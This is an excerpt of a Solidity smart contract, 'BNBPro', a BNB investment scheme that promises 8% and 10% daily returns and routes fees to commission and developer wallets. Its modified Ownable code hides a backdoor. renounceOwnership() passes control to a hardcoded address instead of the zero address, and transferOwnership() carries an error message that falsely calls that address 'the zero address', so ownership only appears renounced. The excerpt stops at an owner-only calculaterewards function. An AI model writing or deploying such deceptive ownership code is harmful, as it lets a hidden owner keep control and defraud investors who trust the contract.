...
abstract contract Ownable is Context {
    ...
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0x461E1426504adcE355F6616CEE98a14A8e4f8c85));
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0x461E1426504adcE355F6616CEE98a14A8e4f8c85), "Ownable: new owner is the zero address");
...
contract BNBPro is Ownable {
	using SafeMath for uint256;

	uint256 constant public INVEST_MIN_AMOUNT = 0.001 ether; // Min 0.001 bnb 
	...
	uint256[] public SEED_PERCENTS 		= [1000, 500, 500, 500, 500];
	uint256 constant public PROJECTIN_FEE = 600; //6%
    uint256 constant public PROJECTOUT_FEE = 800; //8%
	uint256 constant public DEVIN_FEE = 200; //2%
    uint256 constant public DEVOUT_FEE = 100; //1%
	uint256 constant public PERCENT_STEP = 10;
	uint256 constant public PERCENTS_DIVIDER = 10000;
	uint256 constant public PLANPER_DIVIDER = 10000;
	uint256 constant public	WITHDRAW_COOLDOWN = 3 days; // wdraw every 3 days
	...
	constructor(uint256 _launch, address payable _commissionWallet, address payable _devWallet) {
		...
		plans.push(Plan(30, 800)); //8 Daily
		plans.push(Plan(20, 1000)); //10 Daily
	}

	function calculaterewards (uint256 _amount) public onlyOwner {
